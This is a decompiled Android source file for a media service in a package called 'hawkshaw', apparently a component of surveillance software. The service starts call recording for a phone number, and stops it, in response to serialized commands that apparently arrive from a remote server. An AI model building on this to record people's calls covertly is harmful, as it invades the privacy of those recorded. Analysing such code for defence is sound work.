package com.hawkshaw.library.features.media;

import F3.b;
import N1.e;
import Y1.K;
import a3.j;
import android.content.Intent;
import androidx.lifecycle.C0269z;
import com.hawkshaw.library.App;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt;
import com.hawkshaw.library.features.telephony.CallRecorder;
import com.hawkshaw.library.ktextensions.CoroutineKt;
import com.hawkshaw.library.logger.Logger;
import com.hawkshaw.library.utils.NotificationKt;
import j3.f;
import o.C0769d;

public final class MediaService extends C0269z {
    public static final Companion Companion = new Companion((f) null);
    private static final String TAG = "MediaService";
    private CallRecorder callRecorder;

    public static final class Companion {
        private Companion() {
        }

        public /* synthetic */ Companion(f fVar) {
            this();
        }

        public final void handleCallRecorderRequest$library_release(Intent intent) {
            K.n(intent, "intent");
            App.Companion companion = App.Companion;
            Intent intent2 = new Intent(companion.getContext(), MediaService.class);
            intent2.putExtras(intent);
            companion.getContext().startForegroundService(intent2);
        }

        public final void handleMediaCommand$library_release(Command command) {
            K.n(command, "command");
            App.Companion companion = App.Companion;
            Intent intent = new Intent(companion.getContext(), MediaService.class);
            intent.putExtra("type", "HandleMediaCommand");
            b json = ContentNegotiationInterceptorKt.getJson();
            json.getClass();
            intent.putExtra("command", json.b(Command.Companion.serializer(), command));
            companion.getContext().startForegroundService(intent);
        }

        public final void stopService$library_release() {
            App.Companion companion = App.Companion;
            companion.getContext().stopService(new Intent(companion.getContext(), MediaService.class));
        }
    }

    public void onDestroy() {
        super.onDestroy();
        stopForeground(1);
        Logger.v$default(Logger.INSTANCE, TAG, "onDestroy", false, 4, (Object) null);
    }

    public int onStartCommand(Intent intent, int i5, int i6) {
        String stringExtra;
        Logger.v$default(Logger.INSTANCE, TAG, "onStartCommand", false, 4, (Object) null);
        super.onStartCommand(intent, i5, i6);
        startForeground(1, NotificationKt.getNotification$default((String) null, (String) null, (Intent) null, this, 7, (Object) null).build());
        if (!(intent == null || (stringExtra = intent.getStringExtra("command")) == null)) {
            CoroutineKt.safeLaunch$default(C0769d.R(this), (j) null, new e(stringExtra, this, (a3.e) null), 1, (Object) null);
        }
        String stringExtra2 = intent != null ? intent.getStringExtra("type") : null;
        if (stringExtra2 == null) {
            return 2;
        }
        int hashCode = stringExtra2.hashCode();
        if (hashCode != 91931665) {
            if (hashCode != 219342897 || !stringExtra2.equals("StopCallRecording")) {
                return 2;
            }
            CallRecorder callRecorder2 = this.callRecorder;
            if (callRecorder2 != null) {
                callRecorder2.stopRecording();
            }
            this.callRecorder = null;
            stopSelf();
            return 2;
        } else if (!stringExtra2.equals("StartCallRecording")) {
            return 2;
        } else {
            CallRecorder callRecorder3 = new CallRecorder(this, intent.getStringExtra("phone_number"));
            this.callRecorder = callRecorder3;
            callRecorder3.startRecording();
            return 2;
        }
    }
}
